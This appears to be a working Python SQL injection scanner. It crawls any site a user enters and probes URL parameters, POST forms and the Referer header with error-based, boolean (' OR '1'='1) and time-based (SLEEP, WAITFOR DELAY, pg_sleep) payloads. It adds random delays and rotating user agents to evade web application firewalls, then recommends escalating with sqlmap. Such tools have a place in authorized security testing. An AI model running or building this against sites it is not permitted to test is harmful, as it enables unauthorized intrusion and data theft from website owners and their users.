import requests
import time
import random
import re
import difflib
import os
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import xml.etree.ElementTree as ET

# Class to store sqli injection logic
class SQLIDetection:
    # initalises the variable
    def __init__(self, target_url, payloads, errors):
        self.target_url = target_url # Stores the target url
        self.payloads = payloads # Stores the payloads
        self.errors_signatures = errors # Stores the errors
        self.session = requests.Session() # Creates a new user session
        self.noise_threshold = 0.0 # Stores the noise threshold
        self.baseline_content = self.establish_stable_baseline() # Set a stable baseline to compare against

    # Jitters the program to prevent detection from a WAF
    def jitter(self):
        # Sleeps for a random time
        time.sleep(random.uniform(0.5, 2.0))

    # Establishes a stable baseline to handle noisy pages
    def establish_stable_baseline(self):
        # Outputs establishing a baseline
        print("[*] Establishing stable baseline and noise threshold...")
        samples = []
        # Loops three times to get samples
        for i in range(3):
            res = self.session.get(self.target_url, headers=get_random_agent())
            samples.append(res.text)
            if i < 2: time.sleep(1)
        
        # Calculates the similarity between the samples to find noise
        ratio1 = self.get_similarity(samples[0], samples[1])
        ratio2 = self.get_similarity(samples[1], samples[2])
        
        # Calculates the noise threshold
        avg_similarity = (ratio1 + ratio2) / 2
        self.noise_threshold = 1.0 - avg_similarity
        
        # Outputs the noise level found
        print(f"[+] Natural page noise detected: {self.noise_threshold:.4f}")
        return samples[0]

    # Injects payloads into specific URL parameters
    def get_injected_urls(self, payload):
        # Parses the URL components
        parsed_url = urlparse(self.target_url)
        # Gets the parameters
        params = parse_qs(parsed_url.query)
        injected_urls = []

        # Loops over each parameter to inject separately
        for target_param in params:
            new_params = {key: val[:] for key, val in params.items()}
            original_val = new_params[target_param][0]
            # Adds the payload to the parameter value
            new_params[target_param] = [f"{original_val}{payload}"]
            
            # Rebuilds the URL with the injected parameter
            new_query = urlencode(new_params, doseq=True)
            new_url = urlunparse(parsed_url._replace(query=new_query))
            injected_urls.append(new_url)
            
        return injected_urls

    # Checks for a WAF before scanning
    def check_waf(self):
        # Dictionary of WAF signatures
        waf_signatures = {
            "Cloudflare": "cf-ray",
            "Akamai": "akamai-ch",
            "ModSecurity": "mod_security",
            "Barracuda": "barra_counter_session"
        }
        # Outputs checking for WAF
        print("[*] Checking for WAF/IPS...")
        res = self.session.get(self.target_url, headers=get_random_agent())
        # Loops through signatures to find a match
        for name, signature in waf_signatures.items():
            if signature in str(res.headers).lower() or signature in res.text.lower():
                print(f"[!] Warning: {name} WAF detected. Proceed with caution.")
                return True
        return False

    # Compares the similarity
    def get_similarity(self, text1, text2):
        # Returns a float between 0.0 and 1.0 representing similarity.
        return difflib.SequenceMatcher(None, text1, text2).ratio()

    # Function to check error based injection
    def check_error_based(self):
        # Outputs there is a check for the error based sql injection
        print("[*] Testing for Error-based SQLi (All Parameters)...")

        # Loops over the payloads
        for payload in self.payloads["error"]:
            # Gets injected urls for each parameter
            urls = self.get_injected_urls(payload)
            for url in urls:
                try:
                    self.jitter()
                    # Gets the response from the page with the payload
                    response = self.session.get(url, headers=get_random_agent(), timeout=10)
                    # Loops over the signatures in the errors list
                    for signature in self.errors_signatures:
                        # Checks if the signature is in the response text
                        if re.search(signature, response.text, re.IGNORECASE):
                            return f"[!] VULNERABLE: Error-based found on {url} (Matched: {signature})"
                except: continue
        return None
    
    # Checks for boolean based injection
    def check_boolean_based(self):
        # Outputs testing for boolean based sqli
        print("[*] Testing for Boolean-based SQLi (All Parameters)...")
        # Loops over the payloads in the boolean payloads
        for payload_set in self.payloads["boolean"]:
            # Gets urls for both true and false payloads
            urls_true = self.get_injected_urls(payload_set["true"])
            urls_false = self.get_injected_urls(payload_set["false"])

            for i in range(len(urls_true)):
                try:
                    self.jitter()
                    # Stores the true and false response
                    res_true = self.session.get(urls_true[i], headers=get_random_agent())
                    res_false = self.session.get(urls_false[i], headers=get_random_agent())
                    
                    # Fuzzy Logic adjusted by noise threshold
                    diff_sim = self.get_similarity(res_true.text, res_false.text)

                    # Checks if similarity drop is greater than noise plus margin
                    if diff_sim < (1.0 - self.noise_threshold - 0.05):
                        # Returns vulnerable payload found
                        return f"[!] VULNERABLE: Boolean-based found on {urls_true[i]} (Similarity: {diff_sim:.2f})"           
                except: continue 
        return None

    # Checks for time based sql injection
    def check_time_based(self):
        # Outputs checks for time based sqli
        print("[*] Testing for Time-based SQLi (All Parameters)...")
        
        # Loops over the payloads in the time payloads
        for payload in self.payloads["time"]:
            # Gets the injected urls
            urls = self.get_injected_urls(payload)
            # Loops over the urls
            for url in urls:
                try:
                    # Records the starting time
                    start = time.time()
                    # Sends the request
                    self.session.get(url, headers=get_random_agent(), timeout=15)
                    # Calculates the duration
                    duration = time.time() - start
                    # Checks the duaration is more than five secomds
                    if duration >= 5:
                        # Returns which payload triggered
                        return f"[!] VULNERABLE: Time-based found on {url}"
                except requests.exceptions.Timeout:
                    return f"[!] VULNERABLE: Time-based (Timeout triggered) on {url}"
        return None

    # Checks for SQLi in the HTTP headers
    def check_header_injection(self):
        # Outputs testing for header injection
        print("[*] Testing for Header-based SQLi (Referer)...")
        payload = "'"
        headers = get_random_agent()
        # Injects payload into the Referer header
        headers["Referer"] = f"http://google.com/{payload}"
        try:
            res = self.session.get(self.target_url, headers=headers)
            # Checks for errors in the response
            for sig in self.errors_signatures:
                # Searches for the regular expression
                if re.search(sig, res.text, re.IGNORECASE):
                    # Returns vulnerable
                    return f"[!] VULNERABLE: Header-based SQLi found in Referer!"
        except: pass
        return None

    # Finds all forms on the page and tests the input fields
    def check_post_forms(self):
        # Outputs that we are starting form scanning
        print("[*] Searching for HTML forms to test POST-based SQLi...")
        
        # Uses BeautifulSoup to find all form tags
        soup = BeautifulSoup(self.baseline_content, "html.parser")
        forms = soup.find_all("form")
        
        # Loops through every form found on the page
        for form in forms:
            action = form.attrs.get("action")
            # Joins the relative action (e.g., /login.jsp) with the base URL
            post_url = urljoin(self.target_url, action)
            method = form.attrs.get("method", "get").lower()
            
            # We only care about POST forms for this specific check
            if method == "post":
                # Gets all input fields in the form
                inputs = []
                # Loops over the input tag
                for input_tag in form.find_all("input"):
                    # Gets the name from the input tage
                    name = input_tag.attrs.get("name")
                    # Gets the tage type and text
                    type = input_tag.attrs.get("type", "text")
                    # Checks if there is name
                    if name:
                        # Adds it to inputs
                        inputs.append({"name": name, "type": type})

                # Loops through our error payloads to test the form fields
                for payload in self.payloads["error"]:
                    # Stores the data
                    data = {}
                    # Loops over the input in inputs
                    for iput in inputs:
                        # Checks for if the type is submit
                        if iput["type"] != "submit":
                            data[iput["name"]] = payload # Fills every box with the payload
                    
                    try:
                        self.jitter()
                        # Sends the POST request to the form's action URL
                        res = self.session.post(post_url, data=data, headers=get_random_agent())
                        
                        # Checks the response for DB errors
                        for sig in self.errors_signatures:
                            # Searches for the error
                            if re.search(sig, res.text, re.IGNORECASE):
                                return f"[!] VULNERABLE: POST-based SQLi found at {post_url} in form field!"
                    except: continue
        return None
    
    # Function to run a program
    def run(self):
        # Runs the WAF check first
        self.check_waf()
        
        # Stores the results from each of the methods
        results = [
            self.check_error_based(),
            self.check_boolean_based(),
            self.check_time_based(),
            self.check_header_injection(),
            self.check_post_forms()
        ]
        
        # Creates a list of the found results
        found = [result for result in results if result is not None]
        # Checks if there is anything found
        if found:
            # Loops over entries and prints them
            for f in found: print(f)
            print(f"\n[+] Recommendation: Proceed with: sqlmap -u \"{self.target_url}\" --batch --random-agent")
        else:
            # Prints no obivous vulnerabilites found
            print("[-] No obvious vulnerabilities detected.")

# Function to get random user agent from folder
def get_random_agent():
    # Fallback agents if file is missing
    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"]
    # Path to the user agent file
    ua_path = "../../Resources/user_agent_strings.txt"
    
    if os.path.exists(ua_path):
        # Opens the file
        with open(ua_path, "r") as f:
            # Extracts the user agents as a list
            user_agents = [ua.strip() for ua in f if ua.strip()]

    # Returns the headers with a random agent
    return {"User-Agent": random.choice(user_agents)}

def get_errors_messages():
    # Stores the error to be returned
    error_list = []
    # SQL Errors file from sqlmap
    error_file = "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/errors.xml"
    try:
        # Gets the errors from the error file
        errors = requests.get(error_file)
        # Creates the element tree object
        root = ET.fromstring(errors.content)
        # Loops over the tree root for dbms items
        for item in root.findall("dbms"):
            for child in item:
                # Adds the error pattern to the array
                error_list.append(child.get('regexp'))
    except:
        # Fallback if the remote file cannot be reached
        return ["sql syntax", "mysql_fetch", "ora-00933", "sqlite3.operationalerror"]

    # Returns an error list
    return error_list

# Function to crawl a website
def crawl_website(url, domain, visited=None):
    # Checks if visited is none
    if visited is None:
        # Creates a new set for visited
        visited = set()

    # Makes it stay within the same domain and avoid re-visiting pages
    if url in visited or domain not in url:
        # Returns visited
        return visited

    # Outputs thw url which is being visited
    print(f"Visiting: {url}")
    # Adds the url to the set
    visited.add(url)

    try:
        # Gets a response from the page
        response = requests.get(url, headers=get_random_agent(), timeout=5)
        # Only parse HTML content
        if "text/html" not in response.headers.get("Content-Type", ""):
            # Returns the visited page
            return visited
        
        # Creates new beautiful soup object to parse the page
        soup = BeautifulSoup(response.text, 'html.parser')

        # Finds all 'a' tags with an 'href' attribute
        for link in soup.find_all('a', href=True):
            # Gets the link urls
            link_url = link['href']
            
            # Resolve relative URLs (e.g., /about -> https://site.com/about)
            full_url = urljoin(url, link_url)
            
            # Clean fragments (e.g., site.com/#section -> site.com/)
            full_url = full_url.split('#')[0]

            # 3. Recursive call to traverse the next page
            crawl_website(full_url, domain, visited)

    # Catches the error
    except Exception as e:
        # Outputs an error message
        print(f"Could not crawl {url}: {e}")

    # Returns visited
    return visited

def main():
    # Payloads for initial detection
    payloads = {
        "error": ["'", "''", "\"", "`", "')"],
        "boolean": [
            {"true": " AND 1=1", "false": " AND 1=2"},
            {"true": "' OR '1'='1", "false": "' OR '1'='2"}
        ],
        "time": ["' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "') OR pg_sleep(5)--"]
    }

    # Gets the error messages
    errors = get_errors_messages()

    # Allows the user to enter in a url to scan
    url = input("Enter URL: ").strip()
    target_domain = urlparse(url).netloc
    
    # Outputs the pages are being crawled
    print("[*] Starting crawl to map the attack surface...")
    # Stores all of the pages
    all_pages = crawl_website(url, target_domain)
    
    # Then, scan every page discovered
    print(f"[*] Discovery complete. Scanning {len(all_pages)} pages for SQLi...")
    # Loops over the pages
    for page in all_pages:
        # Outputs the page being scanned
        print(f"\n--- Scanning: {page} ---")
        # Runs the scan
        scanner = SQLIDetection(page, payloads, errors)
        scanner.run()

# Starts the program
if __name__ == "__main__":
    main()